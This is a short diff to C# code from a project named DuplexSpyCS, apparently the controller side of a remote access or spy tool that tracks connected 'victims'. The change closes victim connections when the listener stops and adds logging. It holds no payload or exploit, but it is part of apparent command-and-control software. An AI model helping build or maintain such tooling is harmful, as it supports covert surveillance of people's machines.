@@ -56,8 +56,28 @@ namespace DuplexSpyCS
 
         public override void fnStop()
         {
+            foreach (var victim in m_lsVictim)
+            {
+                try
+                {
+                    if (victim.m_sslClnt != null)
+                        victim.m_sslClnt.Close();
+
+                    if (victim.socket != null && victim.socket.Connected)
+                        victim.socket.Close();
+                }
+                catch (Exception ex)
+                {
+                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
+                }
+            }
+
+            m_lsVictim.Clear();
+
             m_listener.Stop();
             m_bIslistening = false;
+
+            clsStore.sql_conn.WriteSystemLogs($"Stop listening port: {m_nPort}");
         }
 
         private byte[] fnCombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
@@ -158,8 +178,7 @@ namespace DuplexSpyCS
 
                             m_lsVictim.Add(victim);
 
-                            clsStore.sql_conn.WriteSystemLogs(
-                                $"Client online: {victim.socket.RemoteEndPoint}");
+                            clsStore.sql_conn.WriteSystemLogs($"Client online: {victim.socket.RemoteEndPoint}");
                         }
                         else if (cmd == 2 && para == 0)
                         {
